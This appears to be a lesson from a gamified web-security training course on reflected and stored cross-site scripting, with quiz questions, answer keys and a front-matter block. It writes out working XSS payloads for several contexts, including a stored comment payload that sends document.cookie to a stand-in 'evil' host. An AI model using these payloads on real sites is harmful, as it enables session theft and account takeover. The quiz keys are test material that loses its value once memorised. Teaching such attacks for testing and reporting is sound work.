---
slug: "the-hall-that-answers"
title: "The Hall That Answers"
kingdom: "web"
place: "hall-of-mirrors"
order: 1
xp: 260
difficulty: 3
minutes: 35
requires: []
skills: ["xss"]
attributes: { exploitation: 2, logic: 1 }
summary: "Whatever you say into the page is said back to you as code. Reflected and stored XSS, the context that decides your payload, and why alert(1) is only the proof, not the report."
---

Cross-site scripting is the app repeating your input back as part of its own page, so the browser runs *your* script in *its* origin. Everything the page can do — read the session, act as the user, rewrite the screen — your injected script can do too. The whole skill is getting your input reflected into a place where the browser treats it as code, and knowing what that is worth beyond a popup.

## Reflected: the answer that comes straight back

Reflected XSS bounces your input back in the *same* response. A search box that echoes your term:

```
GET /search?q=chair
->  <h2>Results for chair</h2>
```

Try a tag instead of a word:

```
GET /search?q=<script>alert(document.domain)</script>
->  <h2>Results for <script>alert(document.domain)</script></h2>
```

If that comes back unescaped, the browser runs it. Reflected XSS needs the victim to open your crafted link, so its impact is "one click from a targeted victim" — real, but you deliver it.

```question
id: reflected
prompt: A search page echoes your q parameter straight into the HTML, so a script tag in q executes when the page loads. Because the payload lives in the link and only fires when a victim opens that link, which kind of XSS is this?
answer: reflected
accept: [reflected xss, reflected cross-site scripting]
hint: It reflects your input back in the same response, delivered by a link.
```

## Stored: the answer the house keeps

Stored XSS is worse because the app *saves* your payload and serves it to everyone who views the page — no link required. A comment, a profile name, a support ticket:

```
POST /comments   body=<script>fetch('https://evil/?c='+document.cookie)</script>
```

Now every user (and every admin who reads tickets) runs it. Stored XSS in an admin-visible field is a favourite path to taking over the *administrator*, because they view attacker-controlled content in their privileged session.

```question
id: stored
prompt: You put a script in a support-ticket message; it is saved and runs in the browser of every staff member who later opens the ticket, in their session. Why is stored XSS in an admin-viewed field so dangerous?
answer: it runs in the admin's session
accept: [it hits the admin, admin account takeover, it runs in staff sessions, it targets admins, runs in the admins session, it can take over the admin]
hint: The privileged user views your content and runs your code.
```

## Context decides the payload

Where your input lands changes the payload entirely. Reflected inside plain HTML, `<script>` works. Reflected inside an attribute, you must first break out of it; reflected inside existing JavaScript, you close the string. Same bug, three payloads:

```html
<div>HERE</div>                 -> <img src=x onerror=alert(1)>
<input value="HERE">            -> "><img src=x onerror=alert(1)>
<script>let s="HERE";</script>  -> ";alert(1);//
```

Reading the *context* your input lands in is the difference between "not vulnerable" and a working payload — the app often escaped one context but not another.

```question
id: context
prompt: Your input is reflected inside an HTML attribute like value="HERE". Before your script can run, what must the payload do first?
answer: break out of the attribute
accept: [break out of the attribute, escape the attribute, close the attribute, break out of the quotes, escape the quotes, close the quote]
hint: You are inside quotes; you must get out of them before injecting a tag or handler.
```

## alert(1) is the proof, not the point

A popup only proves execution. The report is the *impact*: stealing the session token, performing actions as the user (change email, transfer funds), or reading data on the page. When a session cookie lacks `HttpOnly`, XSS reads it directly; when it does not, XSS still acts *as* the user by firing authenticated requests from their browser. A triager pays for impact, not for `alert`.

```question
id: impact
prompt: You have working XSS on a banking app whose session cookie is HttpOnly, so you cannot read the cookie. Can your injected script still perform actions as the logged-in victim, such as changing their email?
answer: yes
accept: [yes, it can act as the user, yes it acts as the user, yes by sending requests, still yes]
hint: The script runs in the victim's authenticated browser; it can send requests as them even without reading the cookie.
```

> The hall repeats what you say as code. Find where your input is reflected or stored, read the context to shape the payload, and then prove real impact — a stolen session, an action as the victim, the admin's account — because execution is the start of the report, not the end.
